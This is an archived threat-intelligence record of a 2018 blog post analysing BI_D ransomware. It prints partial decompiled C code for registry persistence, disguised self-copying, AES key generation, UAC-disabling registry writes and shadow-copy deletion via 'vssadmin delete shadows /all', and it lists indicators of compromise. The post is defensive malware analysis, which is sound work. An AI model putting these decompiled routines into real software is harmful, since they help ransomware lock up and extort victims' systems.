{
    "id": "55d428d7-35bc-4c9c-b6cb-77c68279d5a4",
    "created_at": "2023-01-12T15:04:04.90221Z",
    "updated_at": "2025-03-27T02:06:09.972386Z",
    "deleted_at": null,
    "sha1_hash": "0a92703f6d745568aef49bab82eabeb73837d82e",
    "title": "2018-07-06 - BI_D Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T18:21:49Z",
    "file_modification_date": "2022-05-28T18:21:49Z",
    "file_size": 326973,
    "plain_text": "# BI_D Ransomware\n\n**zirconic.net/2018/07/bi_d-ransomware/**\n\nrhyolite July 7, 2018\n\nI recently came back from REcon 2018 (Montreal) where I took a fantastic class called\n[Binary Literacy taught by Rolf Rolles. This class was one of the best I’ve ever taken (in any](http://www.msreverseengineering.com/training)\nsubject), and helped answer many questions I had been wondering about for years when\nlooking at disassembled code from various samples. I left this class with some new skills\naround manually decompiling disassembled code back into something resembling the\noriginal code, and I highly recommend taking the course if you have the opportunity. Rolf is a\ngreat instructor, and you can tell from the quality of the material and the in-class\npresentations that he’s put a tremendous amount of effort into refining his course.\n\nComing back from the conference, I wanted to put what I just learned into use as soon as I\ncould on a “real” sample. I found a copy of an unnamed ransomware that I’m calling BI_D\nbecause of the file extension that it appends to encrypted files (maybe someone out there\nhas named it since I’ve looked at it). I thought this would be a decent example to start with\nbecause it’s relatively small (only 11,776 bytes) and seemed free from obfuscation and didn’t\nappear to be heavily optimized during compilation. While I manually decompiled pretty much\nthe entire disassembled code (with the exception of a base64 encoding function and another\nfunction that I eventually passed over because I just ran out of steam) I’m not going to share\nthis entire decompilation here. I have some concerns about sharing what could pass as a full\nransomware source code, even if this first project of mine is likely a bit of a mess. I’m sharing\ncertain areas that I found interesting, as well as the Ida file. I’d also point out that Rolf kindly\nlooked at my first draft decompilation and offered valuable (and extensive) feedback —\nhowever, any errors or issues in what I’m presenting are solely my own.\n\nBefore getting into details of the decompilation I’d like to cover some observations and\nexperiences. First, I’m using a 64-bit version of Ida (Ida Free 7.0) for this, even though the\nexecutable is 32-bit (didn’t occur to me until Rolf pointed this out). I do have an old 32-bit\nversion (Ida Free 5.0) but unfortunately it didn’t occur to me before I was well underway in\nthe disassembly. Next time I’ll do this in a Windows VM and run the older 32-bit version to\nmatch my sample. I tried to fix all the function prototypes in the decompilation and\ndisassembly as best I could, but I think that there are a few that seem busted up possibly\ndue to the 64 vs. 32 bit issue (please let me know if you know why this is).\n\nA big next step that I need to take is to really get back into C — I suspect that the majority of\nissues I had while doing the decompilation stemmed from having not done anything\nsubstantive in C for almost 20 years. For instance, I think there are probably consistent\nissues with pointers in what I’m decompiled. It’s probably pretty hard to translate from one\nlanguage to another if you forgot the other language, right? Following the class, I’ve gotten\nbetter about enumerations etc in Ida Setting up the enums structs function prototypes\n\n\n-----\n\netc. in the disassembly really helps make the disassembly more readable and\nunderstandable (not to mention the decompilation). Ida generally does a good job of finding\nstructs, but some things I’ve noticed about structs include:\n– I’ve seen places where there’s a local variable that’s a quadword — these turned out to be\nstructs, so anywhere I see quadwords (or anything other than a 1, 2 or 4 byte parameter) I’m\ngoing to look in what functions use this parameter to see if there should be a struct or array\nthere (assuming Ida didn’t already do this for me).\n– It’s probably also obvious that I didn’t spend much time trying to figure out types, which is\nsomething that needs doing if I’m going to really have a true decompilation of what I’m\nlooking at.\n\nSumming up, I’ve come very far from where I was last time I posted here (or even a month or\ntwo ago), but I think a good next step would be to try doing one of these projects again with a\nnew file. At a certain point it seemed like I should just start over with this one, but I just\ncouldn’t find the motivation to throw everything out and start over from the beginning. I’d\nrather present what I have, warts and all, and then present another project similar to this one\nthat’s (hopefully) much improved on the issues I identified. Regardless of any issues in the\nfinal results, this whole project was a tremendous learning experience for me.\n\nNow I’m going to get into various parts of this ransomware to discuss areas I found\n[interesting (along with the associated decompiled sections). Download my Ida file here. Note](https://zirconic.net/wp-content/uploads/2018/07/BI_D.tif)\nthat you’ll have to change the extension back to .i64 as WordPress didn’t like me uploading\nthat kind of file (or certain other formats).\n\nThe program begins with a small function that calls a main functionality subroutine beginning\nat 4018A0 that I called RANSOM__ExecuteAndTakeover because this is where it executes\nits main functionality and also establishes itself in the victim’s machine. This large function\nachieves persistence via registry, generates cryptographic keys for the ransomware,\ncomplicates recovery of affected files by deleting shadow copies, kills most non-system\nprocesses, and also executes the ransomware payload. My decompilation of this section is\nas follows (unfortunately the formatting on the themes I’ve tried isn’t great for code, so I’ll\ninclude some .txt files you can download for easier reading):\n\n[Download code snippet 1](https://zirconic.net/wp-content/uploads/2018/07/snippet1.txt)\n\n_int * __cdecl RANSOM__ExecuteAndTakeover(){_\n_/* I’ve inserted comments rather than discussing this in the main body of the post, as I_\n_thought it would be easier to follow this way */_\n\nint &Msg, &phkResult, NumberOfBytesWritten, lpString2, &ThreadId, &phKey, &phProv,\nhProv, &pdwDataLen, lpMultibyteStr;\n\nchar &cbData[8]; /* not 100% sure if this is what this is */\n\n\n-----\n\ntypedef struct tagWNDCLASSEX {\nUINT cbSize;\nUINT style;\nWNDPROC lpfnWndProc;\nint cbClsExtra;\nint cbWndExtra;\nHINSTANCE hInstance;\nHICON hIcon;\nHCURSOR hCursor;\nHBRUSH hbrBackground;\nLPCTSTR lpszMenuName;\nLPCTSTR lpszClassName;\nHICON hIconSm;\n} var_30;\n\nncmdshow = dword_404b24 = 0;\nlpString2 = lpFilename = GlobalAlloc(GMEM_ZEROINIT, 0x8000); /* allocate memory to\nreceive the path to this executable file */\nGetModuleFileNameA(0, lpFilename, 0x8000); /* Puts the full path of this file into the newly\nallocated memory */\nif (lstrcmpiA(“C:\\Windows\\notepad+++.exe”, lpString2) != 0){\n/* if the current path does not match this hardcoded path, then copy the file to the\nc:\\windows\\notepad+++.exe location, set it to autorun,\n\n- and also set the actual notepad.exe file to open the ransom note that appears to be\ndropped in the root directory */\n\nRegOpenKeyExA(HKEY_LOCAL_MACHINE,\n“SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\”, 0,\nKEY_ALL_ACCESS_and_WOW64_32KEY, &phkResult);\ncbData = lstrlenA(“c:\\\\Windows\\\\notepad.exe \\”c:\\\\How To Restore Files.txt\\””);\nRegSetValueExA(phkResult, “decrypt”, 0, REG_SZ, “c:\\\\Windows\\\\notepad.exe \\”c:\\\\How To\nRestore Files.txt\\””, cbData);\ncbData = lstrlenA(“c:\\\\Windows\\\\notepad+++.exe”);\nRegSetValueExA(phkResult, “notepad++”, 0, REG_SZ, “c:\\\\Windows\\\\notepad+++.exe”,\ncbData);\nRegCloseKey(phkResult);\nCopyFileA(lpString2, “c:\\\\Windows\\\\notepad+++.exe”, 0);\nnCmdShow = 5;\n}\n\ndword_404b24 = 0; /* we already initialized this to 0 before, not sure why we’re doing this\nagain */\nCryptAcquireContextA(&phProv, 0, 0, PROV_RSA_FULL, CRYPT_DELETEKEYSET); /*\n\n\n-----\n\ndeletes the current context /\nif (CryptAcquireContextA(&phProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) ==\n0)\nCryptAcquireContextA(&phProv, 0, “Microsoft Enhanced Cryptographic Provider v1.0”,\nPROV_RSA_FULL, CRYPT_VERIFYCONTEXT);\n/* if we can’t get the default context successfully, then use the hardcoded one above */\n\nCryptImportKey(phProv, pbData, 0x114, 0 0, &phKey); /* length is 276 bytes / 2208 bits */\nCryptAcquireContextA(&phProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT); /*\nAES */\nCryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, phKey); /* AES 256 */\npdwDataLen = 0x2c;\nCryptExportKey(phKey, 0, CRYPT_NEWKEYSET, 0, lpString2, &pdwDatalen); /* new key set\n*/\npdwDataLen = 0x2c; /* seems redundant */\nCryptEncrypt(phKey, 0, CRYPT_EXPORTABLE, 0, lpString2, &pdwDataLen, CRYPT_SF);\n/* looks like we’re hashing/encrypting the data that was in lpString2, which was the original\nfile path,\n\n- and then this becomes the key as we see later. But does the key blob replace what’s\nalready there? */\nCryptDestroyKey(phKey);\nCryptAcquireContextA(&phProv, 0, 0, PROV_RSA_FULL, CRYPT_DELETEKEYSET); /*\ndelete the key set */\nphProv = CreateFileA(“c:\\\\Windows\\DECODE.KEY”, GENERIC_READ_WRITE, 0, 0,\nOPEN_ALWAYS, 0, 0); /* open this file, creates it if it doesn’t exist */\nSetFilePointer(phProv, 0, 0, FILE_END) /* end of file position */\nWriteFile(phProv, lpString2, 0x100, &NumberofBytesWritten, 0); /* write the key into that\nDECODE.KEY file */\nCloseHandle(phProv);\n/****************************************************************\n\n- Basically at this point, we created a key with RSA/AES256 *\n\n- combo, used the original path data as part of this also (I *\n\n- think) to generate the key, then wrote it out to this file *\n\n- DECODE.KEY. *\n****************************************************************/\nlpMultiByteStr = lpString2+0x400;\nGENERIC__Base64(lpString2, lpString2+0x400, 0x100); /* this looks like a generic base64\nencoding subroutine using a standard base64 index for files */\nRtlMoveMemory(0x40407C, lpMultiByteStr+0x10, 0xa); /* that hex address point to an array\ncontaining the ransom note */\nMultiByteToWideChar(0x3, 0, lpMultiByteStr, -1, WideCharStr, 0xa); /* convert ransomnote to\nwide */\nRegOpenKeyExA(HKEY LOCAL MACHINE,\n\n\n-----\n\nSOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\DateTime\\\\, 0,\nKEY_ALL_ACCESS_and_WOW64_32KEY, &phkResult);\ncbData = 0xa;\nif(RegQueryValueExA(phkResult, “notepad++”, 0, 0, RansomNoteArray+0x22, &lpcbData) !=\n0)\nif(cbData != 0xa)\nRegSetValueExA(phkResult, “notepad++”, 0, REG_SZ, MultiByteStr, 0xa);\n*MultiByteStr[0xa] = 0;\nRegSetValueExA(hKey lpMultiByteStr, 0, REG_BINARY, lpString2, 0x100);\nRegCloseKey(phkResult);\nRtlZeroMemory(lpString2, 0x8000); /* blow away all this memory */\nRegOpenKeyExA(HKEY_LOCAL_MACHINE,\n“SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\”, 0,\nKEY_ALL_ACCESS_and_WOW64_32KEY, *phkResult);\nRegSetValueExA(hKey, “PromptOnSecureDesktop”, 0, REG_DWORD, lpString2, 0x4);\n/* from MSDN: Disabling this policy disables secure desktop prompting. All credential or\nconsent prompting will occur on the interactive user’s desktop. */\nRegSetValueExA(hKey, “EnableLUA”, 0, REG_DWORD, lpString2, 0x4);\n/* from MSDN: Disabling this policy disables the “administrator in Admin Approval Mode”\nuser type. */\nRegSetValueExA(hKey, “ConsentPromptBehaviorAdmin”, 0, REG_DWORD, lpString2, 0x4);\n/* from MSDN: This option allows the Consent Admin to perform an operation that requires\nelevation without consent or credentials. */\nRegCloseKey(hKey);\nGetEnvironmentVariableA(“Comspec”, lpString2, 0x5dc); /* get the command line interpreter\n*/\nShellExecuteA(0, 0, lpString2, “/c vssadmin delete shadows /all”, 0, 0); /* delete shadow\ncopies, presumably to complicate recovery of files on the system */\nGlobalFree(lpString2);\nSetErrorMode(0x1);\nCreateThread(0, 0, RANSOM__ProcKiller, 0, 0, &ThreadId); /* This subroutine iterates\nthrough running processes and kills non-whitelisted processes */\nInitCommonControls(); /* another deprecated function according to MSDN */\nvar_30.cbSize = 0x30;\nvar_30.style = CS_VREDRAW_AND_HREDRAW;\nvar_30.lpfnWndProc = RANSOM__CallMainFunctionality;\nvar_30.CbClsExtra = 0;\nvar_30.cbWndExtra = 0x1e;\nvar_30.hInstance = hInstance;\nvar_30.hbrBackground = COLOR_BTNSHADOW;\nvar_30.lpszClassName = “notepad++”;\nRegisterClassExA(*var_30);\n\n\n-----\n\nCreateDialogParamA(hInstance, 0x65, 0, RANSOM__CallMainFunctionality, 0);\nShowWindow(hWnd, nCmdShow);\nUpdateWindow(hWnd);\nwhile ( GetMessageA(&lpMsg, 0, 0, 0) != 0 ){ /* so keep looping unless we get the WM_QUIT\nmessage */\nTranslateMessage(&Msg);\nDispatchMessageA(&Msg);\n}\nCryptDestroyKey(phKey);\nreturn(Msg.wParam);\n}\n\nOne of the subsequent functions that I found interesting was one that begins at 401676 that I\nnamed RANSOM__FindDrivesEnumResources. I imagine that this isn’t a terribly exciting\nfunction but I thought it was interesting to dig into how calls to GetLogicalDrives() actually\nworks and how the ransomware appears to use the returned bitmask from this function to\ndetermine how many threads to create to encrypt files found there.\n\n[Download code snippet 2](https://zirconic.net/wp-content/uploads/2018/07/snippet2.txt)\n\n_void __cdecl RANSOM__FindDrivesEnumResources(){_\n\nint &ThreadId;\n\n/* used in my interpretation of the recreated code, perhaps invalid: */\nint i, drivebitmask;\n\ndrivebitmask = GetLogicalDrives();\n/* If the function succeeds, the return value is a bitmask representing the currently available\ndisk drives. *\n\n- Bit position 0 (the least-significant bit) is drive A, bit position 1 is drive B, bit position 2 is\ndrive C, and so on. *\n\n- On my test system, I have C and D so I should get back 000…00001100 in eax */ */\n\nfor (i = 25, i >= 0, i–){\n\nif(((0x1 << i) & drivebitmask) != 0){\n/* I suppose you could insert the call to GetLogicalDrives() in the loop, but that’s not how the\ndisassemby looked to me */\nhThread = CreateThread(0, 0, RANSOM__PassWildcardsToEncLogicalDriveFiles, i, 0,\n&ThreadId);\n\nSetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);\n\n\n-----\n\n}\n\n}\n\n/****************************************************************************************************\n\n- this comment refers to the disassembly, but should also be useful here to understand this\nfunc:\n\n- as noted earlier, returns 000…00001100 to eax and then we have 0x19 in ecx or 00011001\n\n- ebx = 1\n\n- cl = 0x19 = 00011001\n\n- ebx << cl = ebx << 1 = 1 << 19 = essentially shifted way out to be almost irrelevant\n\n- ebx & eax = 000….0 & 00001100 = 00000000\n\n- dec ecx = 0x19– = 00011000 and loop back to top\n\n- we keep doing this over and over until we start to get to the bottom of ECX… for instance:\n\n- cl = 2 = 00000011\n\n- ebx = 1\n\n- ebx << cl = 00000001 << 2 = 00000100\n\n- ebx & eax = 00000100 & 00001100 = 00000100 = not zero because now we hit on the C:\\\ndrive bit\n\n- so NOW we execute the createthread\n\n- Since originally ECX is set to 0x19 (25), seems like what we’e doing here is iterating\nthrough\n\n- all possible drive letters, since GetLogicalDrives returns a bitmask where each bit\n\n- represents some drive…\n****************************************************************************************************/\n\nhThread = CreateThread(0, 0, RANSOM__EnumNetworkDrivesNewEnum, 0, 0, &ThreadId);\nSetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);\n\n}\n\nSummarizing the overall functionality of this ransomware based on the overall disassembly\nand decompilation, it can be seen that BI_D:\n– Drops a ransom note called “How To Restore Files.txt” containing instructions asking the\nvictim to contact big_decryptor@aol.com for details on how to pay for file decryption (and\nrequests that the DECODE.KEY file be sent to the ransomware controller)\n– Creates multiple threads to encrypt files on connected and networked drives using the\nRSA/AES256 combination shown above, though is careful not to encrypt already encrypted\nfiles (with a .BI_D extension), the ransom note, or those in the Windows directory\n\n\n-----\n\n– Achieves persistance via the Registry and also takes various steps to both gain greater\naccess to the victim’s machine as well as complicate recovery of encrypted files\n– Kills all processes on the victim’s machine besides the ransomware process itself and a\nsmall process whitelist shown in the screenshot below:\n\nFile details:\n\nMD5: 3cf87e475a67977ab96dff95230f8146\n\nSHA1:1fb3dbd6e4ee27bddfcd1935065339e04dae435c\n\nSHA256: 307bca9a514b1e5038926a0bafc7bc08d131dd6fe3998f31cb1e614e16effe32\n\nSize: 11776 bytes\n\nController/developer email address: big_decryptor@aol.com\n\nEncrypted file extension: .BI_D\n\nInstalls itself to: “c:\\Windows\\notepad+++.exe”\n\nDrops a ransom note to: “c:\\How To Restore Files.txt”\n\nRansom note template:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-06 - BI_D Ransomware.pdf"
    ],
    "report_names": [
        "2018-07-06 - BI_D Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "fe3d8dee-3bee-42e6-8f16-b6628b6189ae",
            "created_at": "2023-01-06T13:46:39.039285Z",
            "updated_at": "2025-03-27T02:00:02.98336Z",
            "deleted_at": null,
            "main_name": "SWEED",
            "aliases": [],
            "source_name": "MISPGALAXY:SWEED",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f2c53785-fb8b-460d-ba73-7fbfba36f0f5",
            "created_at": "2022-10-25T16:07:24.247949Z",
            "updated_at": "2025-03-27T02:02:10.150345Z",
            "deleted_at": null,
            "main_name": "Sweed",
            "aliases": [],
            "source_name": "ETDA:Sweed",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "ForeIT",
                "Formbook",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "Negasteal",
                "Origin Logger",
                "RDP",
                "Remote Desktop Protocol",
                "ZPAQ",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535844,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1653762109,
    "ts_modification_date": 1653762109,
    "files": {
        "pdf": "https://archive.orkl.eu/0a92703f6d745568aef49bab82eabeb73837d82e.pdf",
        "text": "https://archive.orkl.eu/0a92703f6d745568aef49bab82eabeb73837d82e.txt",
        "img": "https://archive.orkl.eu/0a92703f6d745568aef49bab82eabeb73837d82e.jpg"
    }
}